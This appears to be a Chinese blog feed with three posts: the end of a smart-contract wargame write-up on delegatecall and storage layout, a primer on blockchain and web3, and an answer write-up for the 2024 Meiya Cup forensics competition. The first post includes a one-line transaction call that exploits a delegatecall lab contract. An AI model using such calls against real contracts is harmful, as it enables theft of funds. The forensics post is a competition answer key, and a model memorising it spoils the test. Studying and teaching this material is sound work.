class="code"><pre><span class="line">contract.<span class="title function_">sendTransacation</span>(&#123;<span class="attr">data</span>:<span class="number">0x5329b102</span>&#125;)</span><br></pre></td></tr></table></figure><p>补充一点，调用delegatecall的时候需要注意储存布局的一致性。如果有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract A&#123;</span><br><span class="line">address admin;</span><br><span class="line">address user;</span><br><span class="line">&#125;</span><br><span class="line">contract B&#123;</span><br><span class="line">address common_user_1;</span><br><span class="line">address admin;</span><br><span class="line">function setAdminAddress(address _AdminAddress)public&#123;</span><br><span class="line">admin=_AdminAddress;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如我需要调用合约B的函数给A的想给admin赋值，但实际上值会给到user。</p><p>因为智能合约变量声明后会按顺序占据储存槽，所以函数在合约B实际上给储存槽1的变量赋值，对照到合约A就是user；</p><p>所以如果要用delegatecall就必须保证储存布局一致，其中还包括数据类型也要一致。</p><p>知识点：delegatecall和call函数的使用与区分；msg.data；delegatecall的储存布局一致性；引用其他合同的方法</p>]]></content>
      
      
      
        <tags>
            
            <tag> blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链、以太坊、去中心化和web3.0</title>
      <link href="/2025/02/01/%E5%8C%BA%E5%9D%97%E9%93%BE&amp;%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
      <url>/2025/02/01/%E5%8C%BA%E5%9D%97%E9%93%BE&amp;%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="区块链、以太坊、去中心化和web3-0"><a href="#区块链、以太坊、去中心化和web3-0" class="headerlink" title="区块链、以太坊、去中心化和web3.0"></a><strong>区块链、以太坊、去中心化和web3.0</strong></h1><p><strong>1.区块链</strong></p><p>区块链实质上是一种储存数据的结构。它将数据按时间顺序地按批次进行存储，这些批次就是所谓的“区块”，而链则指的是每一个区块都要引用其父块，一旦某一区块内的数据发生改变，则后续区块的数据都会变化。</p><p><strong>2.节点</strong></p><p>网络中的计算机都要对区块链的状态达成共识，这些计算机就是节点。</p><p><strong>3.以太坊</strong></p><p>以太坊就是一条区块链，在以太坊中有一台规范化的计算机Ethereum Virtual Machine，简称EVM，用于对区块链的计算。其状态会得到以太坊网络中的节点的一致同意，每个节点都将保存一份该计算机的状态，任何节点都可以广播请求EVM进行计算，也就是执行代码，当请求被广播以后，所有节点将检查，验证并且执行计算。EVM进行计算后状态发生变化，变化广播到所有节点，所有节点的EVM状态更新。</p><p><strong>4.计算请求</strong></p><p>计算请求也称之为交易请求；区块链中将储存以太坊虚拟机的所有状态以及交易记录并由所有节点达成一致；任何广播计算请求的人将会向以太网络支付部分以太币以防止垃圾交易或者网络被滥用，这部分以太币被称为Gas fees，根据以太坊的EIP-1559机制，Gas fees的一部分将作为基础费用被销毁，减少代币的供应量，以保证以太币的价值；另一部分则奖励给矿工节点作为小费，这是矿工的主要收入来源之一</p><p><strong>5.节点种类</strong></p><p>矿工节点、验证者节点和轻节点、全节点：</p><p>2022年以太坊机制改革之前，主要是工作量证明机制PoW（Proof of Work）区块的提出主要依赖矿工节点。</p><p>矿工节点：一般的非矿工节点主要是验证交易和区块。矿工节点除了前者，的主要任务还包括交易打包到新的区块当中。矿工选择待处理的交易，将其打包为一个候选区块，其中除了交易数据，还包含了上一个区块的哈希和时间戳等等，这些称之为”区块头“。而在区块头中矿工将加入一个字段Nonce，也就是随机数，矿工需要不断地调整随机数使其计算出的哈希使其符合网络规定难度，这个过程也称之为挖矿，可以说挖矿就是在比拼算力。当矿工找到合适的Nonce并且完成打包，新的区块将会形成。另外矿工在挖矿的过程中也会获得挖矿奖励，他和小费一起构成矿工输入的来源。</p><p>2022年改革后，变成权益证明机制（Proof of Stake）矿工角色在以太坊中转变为验证者节点：</p><p>验证者节点：非验证者节点可以通过委托质押（Dapp或者质押池）或者至少单独质押32个以太币，质押后的节点有概率被选中成为区块提议者，收集待处理交易，构建区块并且进行广播；一般而言，质押的ETH数量越多，被选中的概率就越大。</p><p>验证者节点的奖励根据基础奖励乘以不同权重求和再减去离线惩罚来计算，权重包括投票奖励权重、区块提议奖励权重、打包奖励权重等</p><p>除此之外，验证者节点的收入还可以来自手续费和MEV（最大可提取价值，通过优化交易排序套利）；</p><p>全节点和轻节点：</p><p>不是所有的网络节点都会完整的储存区块链副本。轻节点仅仅储存区块链的部分信息，主要是区块头。并且通过于全节点交互来验证数据。</p><p><strong>6.账户</strong></p><p>一个以太坊的账户指的是有以太币余额的实体，账户有两种：</p><p>1.外部所有的账户（Externally Owned Account）：由任何一个持有账户私钥的人控制</p><p>2.合约账户：部署到网络上的智能合约，拥有以太币余额；</p><p><strong>7.智能合约</strong></p><p>智能合约是一段代码，或者说是以太坊链上的一段程序，个人账户可以跟智能合约进行交互，可以从外部进行调用，调用其中公开函数之类，同时也可以向合约账户进行转账。智能合约是Dapp的核心，与智能合约交互的安全问题是区块链安全的重要组成部分。</p><p>以太坊中智能合约通常由solidity语言写成，经过编译后的字节码会部署到区块链上，字节码对所有人可见。</p><p><strong>8.app和Dapp</strong></p><p>传统的app主要包含C&#x2F;S和B&#x2F;S架构：</p><p>在C&#x2F;S架构下：业务逻辑主要储存在客户端软件上，数据则储存在数据库服务器上，用户需要下载诸如桌面应用程序之类的才可使用应用</p><p>在B&#x2F;S架构之下：不依赖桌面应用程序，只需要浏览器即可使用应用；少量的业务逻辑储存在前端，核心业务逻辑储存在业务服务器上，业务服务器再和数据库服务器交互。</p><p>Dapp即去中心化应用，D表示dencentralized，核心的不同是在区块链上运行的智能合约。其架构是：</p><p>用户在浏览器通过前端发送数据到provider，这个provider是以太坊网络中的一个节点，一般如果自己没有节点，都会采用第三方的节点，比入Alchemy，Infura提供的节点等等，通过节点将用户执行代码的请求通过节点广播，考虑到区块链上的储存成本高昂，Dapp产生的数据经过Provider，采用去中心化储存方案储存在链下，同时，由于执行代码需要消耗比特币作为gas，因此会有signer从浏览器中读取私钥签署交易，一般是metamask；相对于数据的写入，我们使用链下索引解决方案如graph读取数据；由于上述步骤成本比较高昂，因此有诸如L2 scaling的一站式拓展方案。</p><p>架构图如下（来自稀土掘金）：</p><p><img src="/2025/02/01/%E5%8C%BA%E5%9D%97%E9%93%BE&%E4%BB%A5%E5%A4%AA%E5%9D%8A%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/dapp%E6%9E%B6%E6%9E%84.png" alt="dapp架构"></p><p>除此之外，还补充一点，这点没有在架构图上有所呈现，就是预言机，预言机用于给区块链提供外部的数据，这很重要，因为区块链是封闭的，没法读取链外数据，只能读取链内的，但在一些特殊场景中必须要由链外数据才可以。比如有一个猜奖游戏的Dapp，猜数字，猜对了给奖金，由于区块链上难以产生合格的随机数以保证公平（合约生成随机数主要依赖链上的确定性信息，生成的随机数容易被矿工提前预测；这个具体可以了解一下Ethernaut闯关的CoinFlip，就是写攻击合约对随机数提前预测猜硬币正反面），这时候需要预言机给他链外提供合格的随机数保证猜奖游戏的公平性。</p><p><strong>9web2.0和web3.0</strong></p><p>web2.0和和web3.0最大的不同在于web3.0是去中心化的，不存在中心服务器运行核心业务代码的情况，而是节点广播请求执行代码；同时，代码自身由于部署在区块链上，考虑到其不可篡改性，web3.0的反单点故障和安全性相对于web2.0有所增强；同时，通过数字身份，通过去中心化分布式储存，用户重新将其数据变为个人财产，数据不再归软件开发者所掌握。但需要指出的是，在代码这部分并非是完全去中心化的，开发者对代码仍然掌握控制权，可以绝对是否开源智能合约的代码，而区块链只能读取字节码。</p><p>设想一下，如果存在一个去中心化的抖音，那么可能相对于中心化抖音有如下变化：</p><p>1.理论上信息茧房消失：由于用户数据的所有权在用户手中，开发者无法通过收集用户数据并分析其模式的方式推断用户的喜好并以此设计算法推荐视频，可能只能在用户公开的视频中随机选择并且推荐给用户。</p><p>2.视频审查机制和评论审查机制变化：人工审查封禁的方式将会消失，只有通过智能合约或者社区投票有可能对视频和评论内容进行审查。但是两者可能面临一些挑战，前者可能难以识别复杂的语义，比如讽刺，隐喻，而后者可能出现恶意团体操纵投票的情况</p><p>3.用户无法被封禁：因为数据归于用户所有，私钥在用户手里，因此平台无法封禁用户；</p><p>4.数据可以跨平台迁移</p><p>5.视频加载速度可能受到去中心化储存节点分布的影响，视频加载速度相对于传统抖音可能会变慢；</p><p>6.用户管理责任加重：如果丢失了私钥，那么用户将永久失去账户。</p><p>总的来说，要用辩证的眼光来看待web2.0和web3.0的关系。</p>]]></content>
      
      
      
        <tags>
            
            <tag> blockchain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024“美亚杯”第十届中国电子数据取证大赛个人赛WP(缺少内存和恶意程序版)</title>
      <link href="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/"/>
      <url>/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<h1 id="2024“美亚杯”第十届中国电子数据取证大赛个人赛WP-缺少内存和恶意程序版"><a href="#2024“美亚杯”第十届中国电子数据取证大赛个人赛WP-缺少内存和恶意程序版" class="headerlink" title="2024“美亚杯”第十届中国电子数据取证大赛个人赛WP(缺少内存和恶意程序版)"></a><strong>2024“美亚杯”第十届中国电子数据取证大赛个人赛WP(缺少内存和恶意程序版)</strong></h1><p><strong>1. [单选题] Emma已经几天没有收到她姐姐Clara的消息了，报警失踪，她焦虑地将手机提交给警察，希望能找到线索。警察将手机交给你进行电子数据取证。你成功提取了Emma手机的镜像。请根据取证结果回答以下问题。根据Emma_Mobile.zip，Emma和Clara的微信聊天记录，Emma最后到警署报案并拍摄写有报案编号的卡片，拍摄时的经纬值是多少？(2分)</strong><br>A. 22.451721666667, 114.171853333333<br>B. 22.451553333333, 114.172845<br>C. 22.451928333333, 114.170503333333<br>D. 22.451638333333, 114.16993<br>A. 22.451721666667, 114.171853333333</p><p>这题显然是要找图片，所以可以利用火眼文件分类的功能在emma手机图片里面找到</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/1.png" alt="1"></p><p>但是exif并没有经纬度信息，其他地方找了一圈也没有，但是发现这个图片来自微信文件夹，和聊天记录有关系，但是emma手机看聊天记录不方便，所以先去看看clara的手机，在clara和emma的微信聊天记录找到再次找到图片</p><p>根据图片对应到Emma手机的message_2.sqlite数据库，找到对应的图片消息记录</p><p>找到图片文件的的多媒体资源url（uuid），并以此对应到Photos.sqlite相同uuid的照片讯息（这里可以用navicat的全数据库查找功能直接找）</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/1-3.png" alt="1-3"></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/1-4.png" alt="1-4"></p><p>A</p><p><strong>2. [单选题] 根据Emma_Mobile.zip，2024年8月30日下午两点后Emma共致电Clara多少次？(1分)</strong><br>A. 85<br>B. 86<br>C. 87<br>D. 88<br>D. 88</p><p>这里也是直接看clara比较方便，筛选条件后是85条，A</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/2.png" alt="2"></p><p><strong>3. [单选题] 根据Emma和Clara的微信聊天记录，Clara失踪前曾告诉Emma会到哪里？(1分)</strong><br>A. 到酒店和丈夫David庆祝结婚周年<br>B. 吃自助餐<br>C. 约了朋友见面<br>D. 去旅行<br><strong>A</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/3.png" alt="3"><strong>4. [填空题] 参考Emma_Mobile.zip，Emma的iPhone XR内微信应用程序的版本是多少？(2分)</strong></p><p>看manifest.plist，这题我用了plist editor，是8.0.50</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/4.png" alt="4"></p><p><strong>5. [多选题] 参考Emma_Mobile.zip，Emma手机中下列哪个选项是正确的？(2分)</strong><br>A. iOS版本为17.6.1<br>B. IMEI为356414106484705<br>C. Apple ID为<a href="mailto:&#69;&#109;&#x6d;&#97;&#49;&#x37;&#x36;&#49;&#x40;&#x67;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#109;">&#69;&#109;&#x6d;&#97;&#49;&#x37;&#x36;&#49;&#x40;&#x67;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#109;</a><br>D. 手机曾经安装Metamask应用程式<br><strong>BD</strong></p><p>A在微信的plist文件：</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/5.png" alt="5"></p><p>B在com.apple.commcenter</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/5-2.png" alt="5-2"></p><p>C</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/5-3.png" alt="5-3"></p><p>D在manifest.plist</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/5-4.png" alt="5-4"></p><p><strong>6. [填空题] 参考Emma_Mobile.zip,Emma手机中Apple ID的注册电子邮箱是多少？(2分)</strong></p><p>见上一题</p><p><strong>7. [填空题] 参考Emma_Mobile.zip，在2024年，Emma手机上曾记录的电话卡集成电路卡标识符(ICCID)是多少？(答案格式:只需使用阿拉伯数字回答)(2分)</strong></p><p>这题还是在com.apple.commcenter</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/7.png" alt="7"></p><p><strong>8. [填空题] 参考Emma_Mobile.zip，Emma手机的蓝牙设备名称”ELK-BLEDOM”的通用唯一标识符(UUID)是什么？(1分)</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/8.png" alt="8"></p><p><strong>9. [单选题] 你发现了一些线索，Emma看起来也很可疑，她似乎背负了大量债务。参考Emma_Mobile.zip，Emma手机内Safari浏览记录中网页”<a href="https://racing.hkjc.com/%22%E7%9A%84%E7%BD%91%E7%AB%99%E6%A0%87%E9%A2%98%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F(1%E5%88%86)">https://racing.hkjc.com/&quot;的网站标题是什么？(1分)</a></strong><br>A. 香港马会奖券有限公司<br>B. 六合彩 - Google 搜索<br>C. 快易钱:网上贷款财务公司 | 足不出户现金即日到手<br>D. 赛马信息 - 香港赛马会<br>找到History.db查看浏览记录</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/9-1.png" alt="9-1"></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/9-2.png" alt="9-2"></p><p><strong>D</strong></p><p><strong>10. [单选题] 参考Emma_Mobile.zip，Emma向Clara透露什么原因令Emma欠下巨债？(1分)</strong><br>A. 投资孖展<br>B. 虚拟货币失利<br>C. 网上赌博<br>D. 以上皆是<br><strong>D</strong></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/10.png" alt="10"></p><p>他这么问，那应该去聊天记录找，所以还是要看clara的手机</p><p><strong>11. [单选题] 参考Emma_Mobile.zip，收债人要求Emma还款数量？(1分)</strong><br>A. 港币$786,990<br>B. 港币$878,990<br>C. 港币$786,980<br>D. 港币$745,330<br><strong>C</strong></p><p>这个找sms.db,可以发现催款记录</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/11.png" alt="11"></p><p><strong>12. [单选题] 参考Emma_Mobile.zip，Emma发送了多少张.PNG图片给Clara，证明自己正被人追债？(2分)</strong><br>A. 6<br>B. 7<br>C. 8<br>D. 9<br>B，这里直接看聊天记录就好，Emma发了催债短信的截图给clara证明自己被追债</p><p><strong>13. [单选题] 参考Emma_Mobile.zip，Emma用来浏览虚拟货币的网址？(2分)</strong><br>A. Google.com<br>B. Facebook.com<br>C. IntellaX.io<br>D. Yahoo.com</p><p>排除法可以得到C，然后打开History.db验证一下，确实发现了C，查询一下，是虚拟货币没有错</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/13.png" alt="13"></p><p><strong>14. [单选题] 参考Emma_Mobile.zip的浏览器记录，有多少网址与bet365有关? (2分)</strong><br>A. 3<br>B. 13<br>C. 9<br>D. 12<br>和浏览器记录有关的数据库有三个:History.db,SafariTabs,Bookmarks.db其中标签页数据库找到一个，书签数据库找到两个，历史记录什么都没有</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/14.png" alt="14"></p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/14-1.png" alt="14-1"></p><p><strong>15. [单选题] 你还发现了一些与不当使用他人加密钱包相关的痕迹。参考Emma_Mobile.zip，Emma用了哪些恢复短语(Recovery Phrase)进入David的虚拟货币账户？(2分)</strong><br>A. stock,avocado,grab,clay<br>B. light,sadness,segment,ancient<br>C. toe,talk,elder,oil<br>D. 以上皆是<br>恢复短语在在Emma手机的图片里，一开始浏览图片文件就可以注意到，选D</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/15.png" alt="15"></p><p><strong>16. [单选题] 参考Emma_Mobile.zip，Emma从David处窃取的虚拟货币的名称是什么？(2分)</strong><br>A. IDFC<br>B. ICAC<br>C. INIC<br>D. IFCC</p><p>这里Emma在聊天向Clara忏悔有提到是IDFC</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/16.png" alt="16"></p><p><strong>17. [单选题] 参考Emma_Mobile.zip，Clara偷拍的照片中，David的虚拟货币余额是多少？(2分)</strong><br>A. 3266378.99<br>B. 1044749.22<br>C. 5022915.66<br>D. 7822468.44</p><p>这题直接可以看Emma手机的图片文件或者看Clara的聊天记录</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/17.png" alt="17"></p><p><strong>18. [单选题] 参考Emma_Mobile.zip，Emma在偷窃David的虚拟货币前，Emma曾向Clara透露有什么事发生在Emma身上？(1分)</strong><br>A. 中彩票<br>B. 欠债<br>C. 升职<br>D. 失业</p><p>B；12题已经提到这一点了</p><p><strong>19. [多选题] (你查看了Emma手机中的一些照片数字信息，以获取更多与失踪案件的信息)Emma的iPhone XR中”IMG_0008.HEIC”的图像与相片名字为的”5005.JPG” 看似为同一张相片，在数码法理鉴证分析下，以下哪样描述是正确？(3分)</strong><br>A. 储存在不同的.db檔案里<br>B. 有不同哈希值<br>C. IMG_0008.HEIC为原图，”5005.JPG”为并非原图<br>D. IMG_0008.HEIC和名字”5005.JPG”是同一张相片<br>格式不同，所以哈希值一定不同;苹果拍摄的原图是HEIC格式，所以HEIC为原图，JPG可能会是缩略图；<br><strong>20. [单选题] 参考Emma_Mobile.zip，Emma的iPhone XR中”IMG_0009.HEIC” 的图像显示拍摄参数怎样？(2分)</strong><br>A. iPhone XR back camera 4.25mm f&#x2F;1.8<br>B. iPhone XR back camera 4.25mm f&#x2F;2.8<br>C. iPhone XR back camera 4.25mm f&#x2F;2<br>D. iPhone XR back camera 4.25mm f&#x2F;1.6</p><p>Photos.sqlite可以找到IMG_0009.HEIC记录，看其ZASSET编号为9，记下经纬度，在EXTEND这个数据库找到ZASSET和经纬度对应的照片，发现是1.8，选A</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/20.png" alt="20"></p><p><strong>21. [多选题] 参考Emma_Mobile.zip，Emma的iPhone XR中相片文件IMG_0009.HEIC提供了什么电子证据信息？(3分)</strong><br>A. 此相片是由隔空投送 (Airdrop)得来<br>B. 此相片由iPhone XR拍摄<br>C. 此相片的拍摄时间为2024-08-05 13:38:15(UTC+8)<br>D. 此相片的拍摄时间为2024-08-06 08:30:52(UTC+8)<br>这题在additionalassetsattribute里，也可以直接搜索选项内容找到</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/21.png" alt="21"></p><p><strong>22. [多选题] 参考Emma_Mobile.zip，Emma的iPhone XR内以下哪张照片是实况照片(Live Photos)？(2分)</strong><br>A. IMG_0002.HEIC<br>B. IMG_0005.HEIC<br>C. IMG_0004.HEIC<br>D. IMG_0006.HEIC<br>B. IMG_0005.HEICD. IMG_0006.HEIC</p><p>？？</p><p><strong>23. [单选题] 参考Emma_Mobile.zip,手机里有多少张照片是用手机后置摄像镜头拍摄的? (2分)</strong><br>A. 5<br>B. 6<br>C. 7<br>D. 8<br>D，在第20题里面，分类计数有八张</p><p><strong>24. [单选题] 参考Emma_Mobile.zip的通讯记录，MesLocalID 224是什么类的文件？(3分)</strong><br>A. 相片<br>B. 影片<br>C. 文件<br>D. 报表<br>这是message_2.sqlite数据库的一个字段，找到224，</p><p><img src="/2025/01/01/2024%E2%80%9C%E7%BE%8E%E4%BA%9A%E6%9D%AF%E2%80%9D%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%A7%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/24.png" alt="24"></p><p>显然这个是那张recover seeds的照片，所以选A</p><p><strong>25. [单选题] 